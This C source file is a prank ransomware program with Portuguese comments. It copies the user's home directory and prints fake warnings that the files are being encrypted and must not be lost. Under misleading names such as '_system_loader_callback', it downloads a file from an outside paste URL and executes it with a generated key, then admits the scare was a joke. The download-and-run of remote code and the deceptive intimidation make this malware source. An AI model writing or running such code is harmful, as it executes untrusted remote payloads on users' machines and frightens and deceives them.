#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "web_handler.c"

char banner[] = "                                            \n"
"                    __      __                  __        _ \n"
"                    \\ \\    / /                 / _|      (_)\n"
"                     \\ \\  / /___    ___  ___  | |_  ___   _ \n"
"                      \\ \\/ // _ \\  / __|/ _ \\ |  _|/ _ \\ | |\n"
"                       \\  /| (_) || (__|  __/ | | | (_) || |\n"
"                        \\/  \\___/  \\___|\\___| |_|  \\___/ |_|\n"
"                                                            \n"
"                                                            \n"
"                                                   _         _ \n"
"                                                  | |       | |\n"
"                  ___ __      __ _ __    __ _   __| |  ___  | |\n"
"                 / _ \\\\ \\ /\\ / /| '_ \\  / _` | / _` | / _ \\ | |\n"
"                | (_) |\\ V  V / | | | || (_| || (_| || (_) ||_|\n"
"                 \\___/  \\_/\\_/  |_| |_| \\__,_| \\__,_| \\___/ (_)\n"
"                                                               \n";

void printa_ascii_art() {
    printf("%s", banner);
}

void encripta_arquivos() {
    srand(time(NULL));

    // gerando um número aleatório entre 0 e 10
    int random_number = rand() % 10;

    if (random_number < 5) {
        int a = 10;
        int b = 15;
        int c = 10 + 15;
    } else {
        int d = 65;
        int f = d + random_number;
    }
}

int _system_integrity_check() {
    // evitando numero 0
    int random_number = (rand() % 5) + 1;
    FILE *fp = fopen("/tmp/key", "w+");
    fprintf(fp, "%d\n", random_number);
    fclose(fp);
    return random_number;
}

void _system_loader_callback(char *url, int key) {
    char* tip = ":)";
    char* filename = ".encriptador";
    download_file_from_url(url, filename);
    char* base_command = "chmod u+x .encriptador && ./.encriptador";
    char command[128];
    sprintf(command, "%s %d\n", base_command, key);
    system(command);
    // deixando um tempo para a "encriptação"
    sleep(2);
}

int main() {
    puts("Olá!");
    system("mkdir -p $USER && cp ~/* $USER 2> /dev/null");
    // fingindo que vou encriptar os arquivos aqui
    puts("Codificando os arquivos da sua home...");
    puts("Procure por uma forma de descodificá-los");
    // dando um susto
    puts("OBS: Não desligue sua máquina, se não não será mais possível recuperar os dados!!!");
    // hehe, era mentira
    sleep(1);
    encripta_arquivos();
    printa_ascii_art();
    int key = _system_integrity_check();
    _system_loader_callback("http://ix.io/2c6V", key);
    puts("brincadeira, fiz uma cópia da sua home no diretório atual e encriptei seus arquivos lá, rs");
    return 0;
}
